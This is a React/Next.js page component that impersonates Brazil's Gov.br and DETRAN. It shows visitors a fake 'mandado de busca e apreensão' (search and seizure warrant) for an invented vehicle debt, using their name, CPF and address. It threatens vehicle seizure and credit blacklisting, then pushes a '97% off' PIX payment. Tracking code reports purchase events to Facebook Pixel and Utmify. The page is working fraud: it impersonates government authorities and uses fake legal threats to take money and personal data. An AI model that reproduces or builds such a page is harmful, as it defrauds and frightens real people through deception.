"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

export default function MandatoPage() {
  const router = useRouter()
  const [address, setAddress] = useState<any>(null)
  const [cpfData, setCpfData] = useState<any>(null)
  const [showOffer, setShowOffer] = useState(false)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const [pixData, setPixData] = useState<any>(null)
  const [phone, setPhone] = useState("")
  const [acceptedTerms, setAcceptedTerms] = useState(false)
  const [showQualification, setShowQualification] = useState(false)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<"pending" | "paid" | "checking">("pending")

  useEffect(() => {
    const addressData = sessionStorage.getItem("upsell_address")
    const cpfDataStr = sessionStorage.getItem("upsell_cpf_data")

    if (!addressData || !cpfDataStr) {
      router.push("/upsell")
      return
    }

    setAddress(JSON.parse(addressData))
    setCpfData(JSON.parse(cpfDataStr))
    setTimeout(() => setShowOffer(true), 2000)
  }, [router])

  const valorFinal = 28.65
  const debitoValor = 847.32
  const mandatoNumero = `${Math.floor(Math.random() * 9000) + 1000}/${new Date().getFullYear()}`
  const dataEmissao = new Date().toLocaleDateString("pt-BR")

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 2) return numbers
    if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPhone(formatPhone(e.target.value))
  }

  const startPaymentStatusCheck = (txId: string) => {
    setPaymentStatus("checking")

    const checkInterval = setInterval(async () => {
      try {
        const response = await fetch(`/api/payment/check-status?transactionId=${txId}`)
        const result = await response.json()

        console.log("[v0] Payment status check (Upsell):", result)

        if (result.success && result.isPaid) {
          setPaymentStatus("paid")
          clearInterval(checkInterval)
          console.log("✅ [v0] Pagamento confirmado (Upsell)!")
        }
      } catch (error) {
        console.error("[v0] Erro ao verificar status:", error)
      }
    }, 5000)

    setTimeout(() => clearInterval(checkInterval), 30 * 60 * 1000)
  }

  const handleGeneratePix = async () => {
    if (!phone || !acceptedTerms) return

    setIsGeneratingPix(true)
    setShowQualification(false)

    try {
      const response = await fetch("/api/payment/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: valorFinal,
          customerData: {
            nome: cpfData.nome,
            cpf: cpfData.cpf.replace(/\D/g, ""),
            telefone: phone.replace(/\D/g, ""),
            email: `${cpfData.cpf.replace(/\D/g, "")}@upsell.temp.com`,
          },
          vehicleData: {
            placa: "UPSELL001",
          },
        }),
      })

      const data = await response.json()

      if (data.success) {
        setPixData(data.transaction)

        startPaymentStatusCheck(data.transaction.transaction_id)
      } else {
        alert("Erro ao gerar PIX. Tente novamente.")
      }
    } catch (error) {
      console.error("[v0] Erro ao gerar PIX:", error)
      alert("Erro ao gerar PIX. Tente novamente.")
    } finally {
      setIsGeneratingPix(false)
    }
  }

  const handleCopyPix = () => {
    if (pixData?.qr_code) {
      navigator.clipboard.writeText(pixData.qr_code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  const handleAcceptOffer = () => {
    setShowQualification(true)
  }

  const handleDeclineOffer = () => {
    router.push("/confirmacao")
  }

  useEffect(() => {
    if (paymentStatus === "paid" && pixData) {
      console.log("✅ [v0] Pagamento confirmado (Upsell)!")

      if (typeof window !== "undefined") {
        try {
          // Fire Utmify purchase event
          if ((window as any).utmify && typeof (window as any).utmify.event === "function") {
            ;(window as any).utmify.event("purchase", {
              value: valorFinal,
              currency: "BRL",
              transaction_id: pixData.transaction_id,
              product: "upsell",
            })
            console.log("✅ Utmify upsell purchase event fired (payment confirmed)")
          }

          // Fire Facebook Pixel purchase event
          if (typeof (window as any).fbq === "function") {
            ;(window as any).fbq("track", "Purchase", {
              value: valorFinal,
              currency: "BRL",
              content_ids: ["upsell"],
              content_type: "product",
            })
            console.log("✅ Facebook upsell purchase event fired (payment confirmed)")
          }
        } catch (pixelError) {
          console.error("❌ Error firing purchase events:", pixelError)
        }
      }
    }
  }, [paymentStatus, pixData])

  if (!address || !cpfData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin h-12 w-12 border-4 border-[#1351B4] border-t-transparent rounded-full" />
      </div>
    )
  }

  if (pixData) {
    return (
      <div className="min-h-screen bg-[#F8F9FA]">
        <header className="bg-[#071D41] py-4 px-4 border-b-4 border-[#FFCD07]">
          <div className="max-w-7xl mx-auto flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <img src="/images/image.png" alt="Gov.br" className="h-10 w-auto" />
              <div className="border-l-2 border-[#FFCD07] pl-3">
                <h1 className="text-white font-bold text-lg">DETRAN Digital</h1>
                <p className="text-[#FFCD07] text-xs">Governo Federal</p>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-bold text-center text-[#071D41] mb-6">Pagamento via PIX</h2>

            {paymentStatus === "paid" && (
              <div className="mb-6 bg-green-50 border-2 border-green-500 rounded-lg p-4">
                <div className="flex items-center gap-3 mb-2">
                  <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <h3 className="text-xl font-bold text-green-700">Pagamento Confirmado!</h3>
                </div>
                <p className="text-green-700 font-medium">
                  Seu pagamento foi aprovado com sucesso. O débito será regularizado em até 24 horas.
                </p>
              </div>
            )}

            {paymentStatus === "checking" && (
              <div className="mb-4 bg-blue-50 border border-blue-300 rounded-lg p-3 flex items-center gap-2">
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                <p className="text-sm text-blue-700">Aguardando confirmação do pagamento...</p>
              </div>
            )}

            {/* Desktop: QR Code */}
            <div className="hidden md:flex flex-col items-center mb-6">
              <img src={pixData.qr_code_image || "/placeholder.svg"} alt="QR Code PIX" className="w-64 h-64 mb-4" />
              <p className="text-sm text-[#555555] text-center">Escaneie o QR Code com o app do seu banco</p>
            </div>

            {/* PIX Copy-Paste Code */}
            <div className="mb-6">
              <label className="block text-sm font-bold text-[#071D41] mb-2">Código PIX Copia e Cola</label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={pixData.qr_code}
                  readOnly
                  className="flex-1 px-4 py-3 border-2 border-gray-300 rounded-lg bg-gray-50 text-sm"
                />
                <button
                  onClick={handleCopyPix}
                  className="px-6 py-3 bg-[#4CAF50] text-white rounded-lg font-bold hover:bg-[#45a049] transition-all"
                >
                  {copied ? "Copiado!" : "Copiar"}
                </button>
              </div>
            </div>

            <div className="bg-blue-50 border-l-4 border-[#1351B4] p-4 rounded">
              <p className="text-sm text-[#071D41]">
                <strong>Valor a pagar:</strong> R$ {valorFinal.toFixed(2)}
              </p>
              <p className="text-xs text-[#555555] mt-2">
                Após o pagamento, a quitação será processada automaticamente.
              </p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (showQualification) {
    return (
      <div className="min-h-screen bg-[#F8F9FA]">
        <header className="bg-[#071D41] py-4 px-4 border-b-4 border-[#FFCD07]">
          <div className="max-w-7xl mx-auto flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <img src="/images/image.png" alt="Gov.br" className="h-10 w-auto" />
              <div className="border-l-2 border-[#FFCD07] pl-3">
                <h1 className="text-white font-bold text-lg">DETRAN Digital</h1>
                <p className="text-[#FFCD07] text-xs">Governo Federal</p>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-2xl mx-auto px-4 py-8">
          <div className="bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-bold text-center text-[#071D41] mb-6">Confirme seus Dados</h2>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-bold text-[#071D41] mb-2">Telefone para Confirmação *</label>
                <input
                  type="text"
                  value={phone}
                  onChange={handlePhoneChange}
                  placeholder="(00) 00000-0000"
                  maxLength={15}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-[#1351B4] focus:outline-none"
                />
              </div>

              <div className="flex items-start">
                <input
                  type="checkbox"
                  id="terms"
                  checked={acceptedTerms}
                  onChange={(e) => setAcceptedTerms(e.target.checked)}
                  className="mt-1 mr-2"
                />
                <label htmlFor="terms" className="text-sm text-[#555555]">
                  Aceito os termos e confirmo que os dados estão corretos
                </label>
              </div>

              <button
                onClick={handleGeneratePix}
                disabled={!phone || !acceptedTerms || isGeneratingPix}
                className="w-full bg-[#4CAF50] text-white py-4 rounded-lg font-bold text-lg hover:bg-[#45a049] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isGeneratingPix ? "Gerando PIX..." : `GERAR PIX - R$ ${valorFinal.toFixed(2)}`}
              </button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA]">
      <header className="bg-[#071D41] py-4 px-4 border-b-4 border-[#FFCD07]">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <img src="/images/image.png" alt="Gov.br" className="h-10 w-auto" />
            <div className="border-l-2 border-[#FFCD07] pl-3">
              <h1 className="text-white font-bold text-lg">DETRAN Digital</h1>
              <p className="text-[#FFCD07] text-xs">Governo Federal</p>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-4xl mx-auto px-4 py-8">
        {/* Warning Banner */}
        <div className="bg-gradient-to-r from-red-600 to-red-700 text-white p-6 rounded-lg shadow-lg mb-6">
          <div className="text-center">
            <svg className="w-16 h-16 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
            <h1 className="text-3xl font-bold mb-2">ALERTA CRÍTICO</h1>
            <p className="text-xl font-semibold">MANDATO DE BUSCA E APREENSÃO AUTORIZADO</p>
          </div>
        </div>

        {/* Official Document */}
        <div className="bg-white rounded-lg shadow-lg border-2 border-red-600 overflow-hidden">
          <div className="bg-[#1351B4] text-white p-6 text-center border-b-4 border-[#FFCD07]">
            <h2 className="text-2xl font-bold mb-1">REPÚBLICA FEDERATIVA DO BRASIL</h2>
            <p className="text-sm opacity-90">Departamento Nacional de Trânsito - DENATRAN</p>
          </div>

          <div className="p-6">
            <div className="text-center mb-6">
              <h3 className="text-2xl font-bold text-red-600 mb-2">MANDATO DE BUSCA E APREENSÃO</h3>
              <p className="text-lg text-[#071D41]">Processo Nº {mandatoNumero}</p>
              <p className="text-sm text-[#555555]">Emitido em: {dataEmissao}</p>
            </div>

            {/* Critical Alert */}
            <div className="bg-red-50 border-l-4 border-red-600 p-4 mb-6 rounded">
              <h4 className="font-bold text-red-600 text-lg mb-2">DÉBITO ESQUECIDO IDENTIFICADO</h4>
              <p className="text-[#071D41]">
                Débito veicular não quitado no valor de{" "}
                <span className="font-bold text-red-600 text-xl">R$ {debitoValor.toFixed(2)}</span> vinculado ao CPF do
                responsável.
              </p>
            </div>

            {/* Owner Data */}
            <div className="bg-gray-50 rounded-lg p-4 mb-6 border border-gray-300">
              <h4 className="font-bold text-[#071D41] mb-3">DADOS DO RESPONSÁVEL</h4>
              <div className="grid md:grid-cols-2 gap-3 text-sm">
                <div>
                  <p className="text-[#555555]">Nome:</p>
                  <p className="font-bold text-[#071D41]">{cpfData.nome}</p>
                </div>
                <div>
                  <p className="text-[#555555]">CPF:</p>
                  <p className="font-bold text-[#071D41]">{cpfData.cpf}</p>
                </div>
              </div>
            </div>

            {/* Address Data */}
            <div className="bg-gray-50 rounded-lg p-4 mb-6 border border-gray-300">
              <h4 className="font-bold text-[#071D41] mb-3">ENDEREÇO PARA BUSCA E APREENSÃO</h4>
              <div className="text-sm space-y-1">
                <p>
                  <span className="font-semibold">Logradouro:</span> {address.logradouro}
                </p>
                <p>
                  <span className="font-semibold">Bairro:</span> {address.bairro}
                </p>
                <p>
                  <span className="font-semibold">Cidade/UF:</span> {address.localidade} - {address.uf}
                </p>
                <p>
                  <span className="font-semibold">CEP:</span> {address.cep}
                </p>
              </div>
            </div>

            {/* Consequences */}
            <div className="bg-red-50 border-2 border-red-600 rounded-lg p-4 mb-6">
              <h4 className="font-bold text-red-600 text-lg mb-3">CONSEQUÊNCIAS DO NÃO PAGAMENTO:</h4>
              <ul className="space-y-2 text-sm">
                <li className="flex items-start">
                  <span className="text-red-600 mr-2">•</span>
                  <span>
                    <strong>Busca e Apreensão:</strong> Remoção imediata do veículo
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="text-red-600 mr-2">•</span>
                  <span>
                    <strong>SERASA:</strong> Negativação do CPF por até 5 anos
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="text-red-600 mr-2">•</span>
                  <span>
                    <strong>Bloqueio do CPF:</strong> Restrição em transações financeiras
                  </span>
                </li>
              </ul>
            </div>

            {/* Offer Section */}
            {showOffer && (
              <div className="bg-gradient-to-r from-[#4CAF50] to-[#45a049] text-white rounded-lg p-6 shadow-lg">
                <div className="text-center mb-4">
                  <h3 className="text-2xl font-bold mb-2">ÚLTIMA CHANCE DE REGULARIZAÇÃO</h3>
                  <p className="text-lg">Evite a busca e apreensão AGORA!</p>
                </div>

                <div className="bg-white/20 rounded-lg p-4 mb-4 text-center">
                  <p className="text-sm mb-1 opacity-90">Valor do Débito:</p>
                  <p className="text-3xl font-bold line-through mb-2">R$ {debitoValor.toFixed(2)}</p>
                  <div className="bg-[#FFCD07] text-[#071D41] inline-block px-4 py-2 rounded-full font-bold text-lg mb-2">
                    DESCONTO EMERGENCIAL: 97% OFF
                  </div>
                  <p className="text-3xl font-bold">PAGUE APENAS R$ {valorFinal.toFixed(2)}</p>
                  <p className="text-sm mt-1 opacity-90">Economize R$ {(debitoValor - valorFinal).toFixed(2)}</p>
                </div>

                <div className="space-y-3">
                  <button
                    onClick={handleAcceptOffer}
                    className="w-full bg-white text-[#4CAF50] py-4 rounded-lg font-bold text-lg hover:shadow-xl transition-all"
                  >
                    SIM! QUITAR AGORA E EVITAR APREENSÃO
                  </button>

                  <button
                    onClick={handleDeclineOffer}
                    className="w-full bg-transparent border-2 border-white text-white py-3 rounded-lg font-medium hover:bg-white/10 transition-all"
                  >
                    Não quero regularizar
                  </button>
                </div>
              </div>
            )}

            {!showOffer && (
              <div className="text-center py-6">
                <div className="animate-spin h-10 w-10 border-4 border-[#1351B4] border-t-transparent rounded-full mx-auto mb-3" />
                <p className="text-[#555555]">Verificando opções...</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
